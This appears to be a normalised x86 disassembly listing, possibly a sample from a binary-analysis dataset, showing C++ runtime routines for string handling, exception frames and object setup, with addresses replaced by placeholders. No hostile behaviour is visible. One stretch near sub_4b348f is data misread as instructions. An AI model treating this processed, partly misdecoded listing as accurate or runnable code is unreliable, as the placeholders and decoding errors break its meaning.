add ecx eax
mov [ ebp - 0x29c ] ecx
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x29c ]
mov cl [ ebp - 0x295 ]
mov [ edx ] cl
mov [ ebp - 0x11c ] 0xc
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x280 ] eax
mov edx [ ebp - 0x278 ]
push edx
mov ecx [ ebp - 0x27c ]
push ecx
mov eax [ ebp - 0x280 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x208 ]
mov [ ebp - 0x284 ] edx
mov [ ebp - 0x285 ] 0x0
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
add ecx [ ebp - 0x230 ]
mov [ ebp - 0x238 ] ecx
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
xor eax eax
add ecx eax
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0x584 ] ecx
lea eax [ ebp - 0xe0 ]
mov edx [ ebp - 0x584 ]
mov cl [ ebp - 0x57d ]
mov [ edx ] cl
mov [ ebp - 0x11c ] 0x6c
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
lea ecx [ ebp - 0xc8 ]
mov ecx [ ebp - 0xc8 ]
jmp r-xdata
mov [ ebp - 0x568 ] eax
mov edx [ ebp - 0x560 ]
push edx
mov ecx [ ebp - 0x564 ]
push ecx
mov eax [ ebp - 0x568 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x4f0 ]
mov [ ebp - 0x56c ] edx
mov [ ebp - 0x56d ] 0x0
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov eax [ ebp - 0xc8 ]
jmp r-xdata
add ecx [ ebp - 0x518 ]
mov [ ebp - 0x520 ] ecx
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
xor eax eax
mov [ edi + 0x20 ] eax
add ecx eax
mov [ ebp - 0x40c ] ecx
lea eax [ ebp - 0x88 ]
mov edx [ ebp - 0x40c ]
mov cl [ ebp - 0x405 ]
mov [ edx ] cl
mov [ ebp - 0x11c ] 0x3c
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
jmp r-xdata
lea ecx [ ebp - 0x70 ]
mov ecx [ ebp - 0x70 ]
jmp r-xdata
mov [ ebp - 0x3f0 ] eax
mov edx [ ebp - 0x3e8 ]
push edx
mov ecx [ ebp - 0x3ec ]
push ecx
mov eax [ ebp - 0x3f0 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x378 ]
mov [ ebp - 0x3f4 ] edx
mov [ ebp - 0x3f5 ] 0x0
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
lea eax [ ebp - 0x70 ]
mov eax [ ebp - 0x70 ]
jmp r-xdata
add ecx [ ebp - 0x3a0 ]
mov [ ebp - 0x3a8 ] ecx
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
mov eax [ ebp - 0x284 ]
mov [ ebp - 0x8 ] eax
add ecx eax
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x28c ]
mov cl [ ebp - 0x285 ]
mov [ edx ] cl
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x23c ] eax
mov edx [ ebp - 0x234 ]
push edx
mov ecx [ ebp - 0x238 ]
push ecx
mov eax [ ebp - 0x23c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x230 ]
mov [ ebp - 0x240 ] edx
mov ecx [ ebp - 0x240 ]
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x245 ] 0x0
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
mov eax [ ebp - 0x56c ]
mov [ ebp - 0xb8 ] eax
add ecx eax
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov cl [ ebp - 0x56d ]
mov [ edx ] cl
lea eax [ ebp - 0xc8 ]
mov eax [ ebp - 0xc8 ]
jmp r-xdata
mov [ ebp - 0x524 ] eax
mov edx [ ebp - 0x51c ]
push edx
mov ecx [ ebp - 0x520 ]
push ecx
mov eax [ ebp - 0x524 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0xb8 ]
sub edx [ ebp - 0x518 ]
mov [ ebp - 0x528 ] edx
mov ecx [ ebp - 0x528 ]
mov [ ebp - 0x52c ] ecx
mov [ ebp - 0x52d ] 0x0
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
mov eax [ ebp - 0x3f4 ]
mov [ ebp - 0x60 ] eax
add ecx eax
mov [ ebp - 0x3fc ] ecx
mov edx [ ebp - 0x3fc ]
mov cl [ ebp - 0x3f5 ]
mov [ edx ] cl
lea eax [ ebp - 0x70 ]
mov eax [ ebp - 0x70 ]
jmp r-xdata
mov [ ebp - 0x3ac ] eax
mov edx [ ebp - 0x3a4 ]
push edx
mov ecx [ ebp - 0x3a8 ]
push ecx
mov eax [ ebp - 0x3ac ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x3a0 ]
mov [ ebp - 0x3b0 ] edx
mov ecx [ ebp - 0x3b0 ]
mov [ ebp - 0x3b4 ] ecx
mov [ ebp - 0x3b5 ] 0x0
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
mov edx [ ebp - 0x244 ]
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x24c ] eax
mov eax [ ebp - 0x24c ]
mov cl [ ebp - 0x245 ]
mov [ eax ] cl
jmp r-xdata
mov edx [ ebp - 0x52c ]
mov [ ebp - 0xb8 ] edx
add eax edx
mov [ ebp - 0x534 ] eax
mov eax [ ebp - 0x534 ]
mov cl [ ebp - 0x52d ]
mov [ eax ] cl
jmp r-xdata
mov edx [ ebp - 0x3b4 ]
mov [ ebp - 0x60 ] edx
add eax edx
mov [ ebp - 0x3bc ] eax
mov eax [ ebp - 0x3bc ]
mov cl [ ebp - 0x3b5 ]
mov [ eax ] cl
jmp r-xdata
sub_4b2a00
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x3
dec [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
sub [ ebp - 0x8 ] 0x3
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_4b3230
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
sub_4b2d24
jmp r-xdata
test esi esi
jne r-xdata
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xa5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
inc [ ebp - 0x8 ]
mov eax rw-data
mov [ edi ] eax
mov edx rw-data
inc [ ebp - 0x8 ]
mov [ edi ] edx
mov edx [ ebp - 0x24 ]
mov eax edi
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x40 ]
mov [ ebp - 0xb0 ] edx
mov ecx [ ebp - 0x2c ]
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x2c ]
add edx 0x10
mov eax [ ebp - 0x2c ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xac ] eax
mov eax [ ebp - 0xac ]
mov cl [ ebp - 0xa5 ]
mov [ eax ] cl
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xb4 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xb8 ] eax
mov edx [ ebp - 0xb0 ]
push edx
mov ecx [ ebp - 0xb4 ]
push ecx
mov eax [ ebp - 0xb8 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x40 ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xbd ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0xbc ]
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xc4 ] ecx
mov edx [ ebp - 0xc4 ]
mov cl [ ebp - 0xbd ]
mov [ edx ] cl
sub_4b2ee4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x8 ]
mov [ edx + 0x8 ] eax
add eax 0x4
push eax
call sub_4c3b78
pop ecx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_4b2f24
push ebp
mov ebp esp
add esp 0xffffffd0
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
dec [ ebp - 0x10 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov esi [ ebx + 0x8 ]
lea edx [ esi + 0x4 ]
push edx
call sub_4c3b88
pop ecx
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
push ebx
call sub_4b0180
pop ecx
xor edi edi
mov edi esi
jmp r-xdata
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] 0x24
push 0x3
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ edx ]
call [ ecx ]
mov [ ebp - 0x1c ] 0xc
add esp 0x8
mov [ ebp - 0x8 ] edi
test edi edi
je r-xdata
sub_4b3018
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx rw-data
mov [ ebx + 0x8 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jbe r-xdata
push ebx
call sub_4b31e0
pop ecx
push 0x3
mov eax [ ebx + 0x2c ]
push eax
call sub_4b2f24
add esp 0x8
dec [ eax + rw-data ]
mov dl [ eax + rw-data ]
test dl dl
jle r-xdata
push ebx
call sub_4b0180
pop ecx
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
sub_4b308c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebx [ esi + 0x28 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x4 ]
push eax
push esi
push edi
call [ ebx + 0x8 ]
add esp 0xc
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_4b30b8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov esi rw-data
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
push eax
call sub_4c3b24
pop ecx
cmp eax 0x3
jne r-xdata
inc [ ebx + 0xc ]
mov ecx [ ebx + 0xc ]
cmp ecx 0x8
jb r-xdata
inc [ ebp - 0xc ]
xor edx edx
mov [ ebp - 0x18 ] 0x18
mov [ ebx + 0xc ] edx
jmp r-xdata
mov ecx [ ebx + 0xc ]
mov eax [ esi + ecx * 4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
mov [ esi + eax * 4 ] ebx
inc [ eax + rw-data ]
dec [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
mov edx [ ebx + 0xc ]
cmp ebx eax
je r-xdata
push eax
call sub_4c3b58
pop ecx
cmp eax 0x3
jne r-xdata
mov [ ebp - 0x18 ] 0x18
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4b3158
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
xor edx edx
xor ecx ecx
mov [ ebx + 0x2c ] edx
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] 0x11
mov [ ebx + 0x1c ] 0x6
xor eax eax
xor edx edx
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x24 ] edx
xor ecx ecx
mov [ ebx + 0x28 ] ecx
push 0x0
push 0x0
push ebx
call sub_4b02b0
add esp 0xc
push 0x10
call sub_4bbbac
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x18 ] 0x24
mov edx [ ebp - 0x4 ]
push edx
call sub_4b9c3c
pop ecx
mov [ ebp - 0x18 ] 0xc
mov ecx [ ebp - 0x4 ]
jmp r-xdata
mov [ ebx + 0x2c ] ecx
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop ebx
mov esp ebp
pop ebp
retn
sub_4b31e0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push 0x0
push esi
call sub_4b308c
add esp 0x8
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
xor edx edx
mov [ esi + 0x24 ] edx
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov ebx [ eax ]
push eax
call sub_4b0180
pop ecx
mov eax ebx
test eax eax
jne r-xdata
xor edx edx
mov [ esi + 0x28 ] edx
pop esi
pop ebx
pop ebp
retn
mov ebx [ eax ]
push eax
call sub_4b0180
pop ecx
mov eax ebx
test eax eax
jne r-xdata
sub_4b3230
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
dec [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
dec [ ebp - 0x8 ]
mov ebx [ ebp + 0x8 ]
add ebx 0x8
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
xor eax eax
cmp edx 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4b0180
pop ecx
xor edx edx
mov [ ebx + 0x20 ] edx
add ecx edx
mov edx ecx
mov [ edx ] al
dec [ ebp - 0x8 ]
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0264
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
sub_4b348f
inc [ eax ]
add [ eax ] al
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
pop edi
dec ecx
outsd
jae r-xdata
sub cl [ esi ]
cmp al 0x69
outsb
je r-xdata
pop ebp
retn
push eax
call sub_4b0180
pop ecx
popa
arpl [ ebp + 0x74 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
add [ eax ] cl
add [ eax ] al
add [ ebx ] al
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ ebx ] dh
add [ eax ] al
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
mov [ eax ] edx
test [ ebp + 0xc ] 0x1
je r-xdata
mov edx rw-data
sub_4b3514
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
lea ebx [ ebp - 0x24 ]
mov esi rw-data
mov edi rw-data
mov eax rw-data
call sub_4c517c
mov [ ebx + 0x10 ] 0xc
push rw-data
call sub_4b38e4
pop ecx
inc [ ebx + 0x1c ]
push rw-data
call sub_4bd868
pop ecx
mov edx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] edx
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ rw-data ] ecx
mov eax rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] eax
inc [ ebx + 0x1c ]
mov edx rw-data
mov [ rw-data ] edx
lea ecx [ esi + 0x10 ]
inc [ ebx + 0x1c ]
mov [ esi ] ecx
mov eax rw-data
mov edx rw-data
mov [ esi + 0x18 ] eax
mov ecx rw-data
inc [ ebx + 0x1c ]
mov [ esi + 0x18 ] edx
inc [ ebx + 0x1c ]
mov [ esi + 0x4 ] ecx
mov eax [ esi ]
mov edx rw-data
mov [ eax + 0x8 ] edx
push eax
call sub_4b30b8
pop ecx
mov eax rw-data
inc [ ebx + 0x1c ]
lea ecx [ edi + 0x8 ]
mov [ edi ] ecx
mov [ edi + 0x10 ] eax
inc [ ebx + 0x1c ]
mov edx rw-data
mov [ edi + 0x10 ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov [ edi + 0x4 ] ecx
mov eax [ edi ]
mov edx rw-data
mov [ eax + 0x8 ] edx
push eax
call sub_4b30b8
pop ecx
mov eax rw-data
inc [ ebx + 0x1c ]
mov ecx rw-data
mov [ rw-data ] ecx
mov edx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] eax
inc [ ebx + 0x1c ]
mov [ rw-data ] rw-data
mov [ rw-data ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] ecx
inc [ ebx + 0x1c ]
mov eax rw-data
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
mov [ eax + 0x8 ] edx
push eax
call sub_4b30b8
pop ecx
mov edx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] rw-data
mov [ rw-data ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] ecx
inc [ ebx + 0x1c ]
mov eax rw-data
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
mov [ eax + 0x8 ] edx
push eax
call sub_4b30b8
pop ecx
inc [ ebx + 0x1c ]
mov edx [ ebx ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4b36b4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
mov edi rw-data
lea esi [ ebp - 0x24 ]
call sub_4c517c
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
push 0x0
push rw-data
call sub_4b3018
add esp 0x8
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
push 0x0
push rw-data
call sub_4b3018
dec [ esi + 0x1c ]
mov edx rw-data
mov [ edi ] edx
add esp 0x8
cmp [ edi + 0x4c ] 0x0
je r-xdata
dec [ esi + 0x1c ]
mov eax rw-data
mov [ edi ] eax
push 0x3
mov edx [ edi + 0x3c ]
push edx
call sub_4b2f24
add esp 0x8
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
push 0x0
push rw-data
call sub_4b3018
add esp 0x8
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
push 0x0
push rw-data
call sub_4b3018
dec [ esi + 0x1c ]
mov ecx rw-data
mov [ rw-data ] ecx
add esp 0x8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x50 ] 0x0
mov ebx edi
jne r-xdata
dec [ esi + 0x1c ]
mov edx rw-data
mov [ rw-data ] edx
push 0x3
mov ecx [ rw-data ]
push ecx
call sub_4b2f24
dec [ esi + 0x1c ]
mov eax rw-data
mov [ rw-data ] eax
add esp 0x8
cmp [ rw-data ] 0x0
je r-xdata
mov ebx rw-data
cmp [ rw-data ] 0x0
jne r-xdata
push edi
call sub_4b6afc
pop ecx
test al al
jne r-xdata
xor ecx ecx
mov ebx ecx
jmp r-xdata
dec [ esi + 0x1c ]
mov ecx rw-data
mov [ rw-data ] ecx
push 0x3
mov eax [ rw-data ]
push eax
call sub_4b2f24
add esp 0x8
dec [ esi + 0x1c ]
push 0x2
push rw-data
call sub_4c0568
add esp 0x8
dec [ esi + 0x1c ]
push 0x2
push rw-data
call sub_4b6750
add esp 0x8
mov edx [ esi ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx rw-data
cmp [ rw-data ] 0x0
jne r-xdata
push rw-data
call sub_4b6afc
pop ecx
test al al
jne r-xdata
xor eax eax
mov ebx eax
jmp r-xdata
mov edx [ edi + 0x50 ]
push edx
call sub_4c6870
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ebx eax
push 0x2
push 0x0
push edi
call sub_4b64e8
add esp 0xc
push rw-data
call sub_4b6afc
pop ecx
test al al
jne r-xdata
xor edx edx
mov ebx edx
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call sub_4c6870
pop ecx
test eax eax
je r-xdata
xor edx edx
mov ebx edx
push 0x2
push 0x0
push rw-data
call sub_4b64e8
add esp 0xc
xor ecx ecx
mov ebx ecx
mov eax [ rw-data ]
push eax
call sub_4c6870
pop ecx
test eax eax
je r-xdata
xor ecx ecx
mov ebx ecx
push 0x2
push 0x0
push rw-data
call sub_4b64e8
add esp 0xc
xor eax eax
mov ebx eax
xor edx edx
mov ebx edx
sub_4b38e4
push ebp
mov ebp esp
add esp 0xfffff9ac
push ebx
push esi
push edi
lea ebx [ ebp - 0x2f0 ]
mov eax rw-data
call sub_4c517c
mov [ ebx + 0x10 ] 0xc
mov [ ebx + 0x10 ] 0x18
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_4c3b24
pop ecx
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov [ ebp - 0x2f1 ] 0x1
mov [ rw-data ] 0x1
inc [ rw-data ]
mov [ ebp - 0x2f1 ] 0x0
jmp r-xdata
inc [ ebx + 0x1c ]
mov [ ebx + 0x10 ] 0x24
cmp [ rw-data ] 0x0
jl r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_4c3b58
pop ecx
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
dec [ ebx + 0x1c ]
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov edx [ ebx ]
mov [ fs : 0x0 ] edx
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push 0x58
call sub_415614
add esp 0x8
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0xc
cmp [ ebp - 0x2f1 ] 0x0
je r-xdata
push rw-data
push 0x58
call sub_415614
add esp 0x8
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x54
mov edx rw-data
mov ecx [ ebp - 0x8 ]
mov [ ecx ] edx
push 0x10
call sub_4bbbac
pop ecx
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
push rw-data
push 0x50
call sub_415614
add esp 0x8
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x9c
mov edx rw-data
mov ecx [ ebp - 0x10 ]
mov [ ecx ] edx
push 0x10
call sub_4bbbac
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebx + 0x10 ] 0x78
mov edx [ ebp - 0xc ]
push edx
call sub_4b9c3c
pop ecx
mov [ ebx + 0x10 ] 0x60
mov ecx [ ebp - 0xc ]
jmp r-xdata
push rw-data
push 0x48
call sub_415614
add esp 0x8
mov [ ebp - 0xc4 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0xe4
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
add edx 0x10
mov [ ecx ] edx
mov edx rw-data
mov eax [ ebp - 0x18 ]
add eax 0x10
mov [ ebp - 0x2f8 ] eax
mov eax rw-data
mov ecx [ ebp - 0x2f8 ]
mov [ ecx + 0x8 ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0x2f8 ]
mov [ edx + 0x8 ] eax
mov edx rw-data
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x18 ]
mov eax [ ecx ]
xor ecx ecx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] ecx
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
push esi
call sub_4b3158
pop ecx
xor edx edx
mov [ esi + 0x30 ] rw-data
mov [ esi + 0x34 ] edx
lea eax [ ebp - 0x28 ]
mov [ ebx + 0x10 ] 0xf0
mov ecx [ esi + 0x2c ]
push ecx
push eax
call sub_4b2ee4
inc [ ebx + 0x1c ]
inc [ ebx + 0x1c ]
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x300 ] edx
xor ecx ecx
mov [ ebx + 0x10 ] 0xfc
mov [ ebp - 0x2c ] ecx
add esp 0x8
cmp [ ebp - 0x2c ] 0x1
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x10 ] 0xc0
mov edx [ ebp - 0x14 ]
push edx
call sub_4b9c3c
pop ecx
mov [ ebx + 0x10 ] 0xa8
mov ecx [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x3c ] ecx
mov [ ebx + 0x10 ] 0x54
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
add edx 0xc
mov [ eax + 0x14 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
add edx 0x10
mov [ ecx + 0x18 ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add eax 0x1c
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
add ecx 0x20
mov [ eax + 0x28 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
add edx 0x2c
mov [ ecx + 0x34 ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add eax 0x30
mov [ edx + 0x38 ] eax
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x18 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x28 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x38 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x14 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x24 ]
mov [ eax ] edx
xor edx edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x34 ]
mov ecx rw-data
mov [ eax ] edx
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x8 ]
mov [ eax ] ecx
push 0x0
push rw-data
mov edx [ ebp - 0x8 ]
push edx
call sub_4b64e8
add esp 0xc
dec [ ebx + 0x1c ]
mov [ ebx + 0x10 ] 0x3c
mov eax [ rw-data ]
mov [ ebp - 0x490 ] eax
mov edx [ ebp - 0x490 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x494 ] eax
mov edx [ ebp - 0x490 ]
mov [ edx + 0x34 ] rw-data
push rw-data
push 0x58
call sub_415614
add esp 0x8
mov [ ebp - 0x170 ] eax
test eax eax
je r-xdata
mov [ ebx + 0x10 ] 0x174
mov eax [ ebp - 0xc4 ]
mov edx [ ebp - 0xc4 ]
add edx 0x8
mov ecx rw-data
mov [ eax ] edx
mov edx [ ebp - 0xc4 ]
add edx 0x8
mov [ ebp - 0x3c4 ] edx
mov edx rw-data
mov eax [ ebp - 0x3c4 ]
mov [ eax + 0x8 ] ecx
mov eax rw-data
inc [ ebx + 0x1c ]
mov ecx [ ebp - 0x3c4 ]
mov [ ecx + 0x8 ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov edx [ ebp - 0xc4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0xc4 ]
mov edx [ eax ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp - 0xc4 ]
mov esi [ ecx ]
push esi
call sub_4b3158
pop ecx
xor eax eax
mov [ esi + 0x30 ] rw-data
mov [ esi + 0x34 ] eax
